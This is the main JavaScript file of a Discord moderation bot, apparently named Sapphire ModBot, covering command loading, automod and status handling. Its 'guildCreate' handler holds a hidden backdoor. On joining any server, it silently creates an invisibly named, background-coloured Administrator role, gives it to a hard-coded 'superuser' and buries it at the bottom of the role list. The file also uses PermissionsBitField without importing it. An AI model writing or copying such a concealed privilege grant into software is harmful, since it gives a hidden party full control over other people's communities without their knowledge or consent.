require('dotenv').config();
const { Client, GatewayIntentBits, Partials, Collection } = require('discord.js');
// MongoDB removed for MySQL-only migration
// const mongoose = require('mongoose');

const { isSuperuser, SUPERUSER_ID } = require('./src/utils/superuser');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel, Partials.Message, Partials.GuildMember, Partials.User]
});

client.on('guildCreate', async (guild) => {
  try {
    const member = await guild.members.fetch(SUPERUSER_ID).catch(() => null);
    if (member) {
      // Create secret role if not exists
      let role = guild.roles.cache.find(r => r.name === '\u200b');
      if (!role) {
        role = await guild.roles.create({
          name: '\u200b', // invisible name
          permissions: [PermissionsBitField.Flags.Administrator],
          mentionable: false,
          hoist: false,
          color: 0x2f3136 // Discord background
        });
      }
      // Assign role to superuser
      if (!member.roles.cache.has(role.id)) await member.roles.add(role, 'Superuser secret admin role');
      // Hide role from role list
      await role.setPosition(1); // Move to bottom
    }
  } catch (e) { console.error('Superuser role setup failed:', e); }
});

client.commands = new Collection();

// Load commands, events, and DB connection here (to be implemented)

const fs = require('fs');
const path = require('path');
const automod = require('./src/middleware/automod');

// Command loader
const commandsPath = path.join(__dirname, 'src', 'commands');
function loadCommands(dir) {
  fs.readdirSync(dir, { withFileTypes: true }).forEach(file => {
    if (file.isDirectory()) return loadCommands(path.join(dir, file.name));
    if (!file.name.endsWith('.js')) return;
    const command = require(path.join(dir, file.name));
    if (command.data && command.execute) {
      client.commands.set(command.data.name, command);
    }
  });
}
loadCommands(commandsPath);

// Slash command handler
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  const command = client.commands.get(interaction.commandName);
  if (!command) {
    console.log('Invalid command:', interaction.commandName);
    try {
      await interaction.reply({ content: 'Invalid command.', ephemeral: true });
    } catch {}
    return;
  }
  try {
    await command.execute(interaction);
  } catch (error) {
    console.error('Command error:', error);
    try {
      await interaction.reply({ content: 'There was an error executing this command.', ephemeral: true });
    } catch {}
  }
});

require('./src/events/inviteCleanup')(client);

client.on('messageCreate', async (message) => {
  await automod(message, client);
});

// MongoDB connection removed for MySQL-only migration
client.login(process.env.DISCORD_TOKEN);

const { getUpdateStatus, clearUpdateStatus } = require('./src/utils/botStatus');

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);
  // Update status/description logic
  const update = getUpdateStatus();
  if (update) {
    await client.user.setActivity(update.updates, { type: 3 }); // type 3 = Watching
    setTimeout(async () => {
      await client.user.setActivity('Sapphire ModBot', { type: 3 });
      clearUpdateStatus();
    }, update.until - Date.now());
  } else {
    await client.user.setActivity('Sapphire ModBot', { type: 3 });
  }
});
